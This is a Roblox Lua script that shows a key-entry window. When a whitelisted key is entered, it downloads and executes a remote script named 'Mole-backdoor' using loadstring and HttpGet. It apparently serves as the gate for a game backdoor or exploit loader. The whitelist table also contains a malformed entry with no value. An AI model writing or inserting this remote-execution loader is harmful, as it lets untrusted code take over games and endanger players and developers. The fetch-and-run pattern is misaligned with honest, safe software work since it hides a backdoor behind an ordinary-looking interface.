local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local localPlayer = Players.LocalPlayer

local whitelisted = {
    ["owner"] = true,
    ["0001"] = true,
    ["xlpax"] = true,
    ["0002"]
}

local gui = Instance.new("ScreenGui")
gui.Name = "AccessKeyUI"
gui.ResetOnSpawn = false

-- Try CoreGui first, fallback to PlayerGui
pcall(function()
    gui.Parent = game:GetService("CoreGui")
end)
if not gui.Parent then
    gui.Parent = localPlayer:WaitForChild("PlayerGui")
end

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 200)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
frame.BorderSizePixel = 0
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel")
title.Text = "Access Key Required"
title.Size = UDim2.new(1, 0, 0, 48)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(245, 245, 245)
title.Parent = frame

local inputBox = Instance.new("TextBox")
inputBox.PlaceholderText = "Enter your access key"
inputBox.Text = ""
inputBox.Size = UDim2.new(0.9, 0, 0, 40)
inputBox.Position = UDim2.new(0.05, 0, 0.4, 0)
inputBox.BackgroundColor3 = Color3.fromRGB(235, 235, 240)
inputBox.TextColor3 = Color3.fromRGB(25, 25, 25)
inputBox.Font = Enum.Font.Code
inputBox.TextSize = 18
inputBox.ClearTextOnFocus = false
inputBox.Parent = frame
Instance.new("UICorner", inputBox).CornerRadius = UDim.new(0, 8)

local feedback = Instance.new("TextLabel")
feedback.Text = ""
feedback.Size = UDim2.new(1, -20, 0, 20)
feedback.Position = UDim2.new(0.5, 0, 0.68, 0)
feedback.AnchorPoint = Vector2.new(0.5, 0)
feedback.BackgroundTransparency = 1
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 14
feedback.TextColor3 = Color3.fromRGB(255, 95, 95)
feedback.TextScaled = false
feedback.TextWrapped = true
feedback.Parent = frame

local submitBtn = Instance.new("TextButton")
submitBtn.Text = "Submit"
submitBtn.Size = UDim2.new(0.9, 0, 0, 40)
submitBtn.Position = UDim2.new(0.05, 0, 0.8, 0)
submitBtn.BackgroundColor3 = Color3.fromRGB(70, 160, 120)
submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
submitBtn.Font = Enum.Font.GothamBold
submitBtn.TextSize = 18
submitBtn.BorderSizePixel = 0
submitBtn.Parent = frame
Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0, 8)

submitBtn.MouseEnter:Connect(function()
    submitBtn.BackgroundColor3 = Color3.fromRGB(90, 190, 140)
end)
submitBtn.MouseLeave:Connect(function()
    submitBtn.BackgroundColor3 = Color3.fromRGB(70, 160, 120)
end)

submitBtn.MouseButton1Click:Connect(function()
    local key = inputBox.Text
    if whitelisted[key] then
        gui:Destroy()
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mole-backdoor/refs/heads/main/Mole.lua"))()
        end)
        if not success then
            warn("Failed to load script:", err)
        end
    else
        inputBox.Text = ""
        inputBox.PlaceholderText = "Invalid key, try again"
        feedback.Text = "❌ Invalid key. Please try again."
    end
end)

-- Draggable Frame
local dragging = false
local dragInput, dragStart, startPos

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)
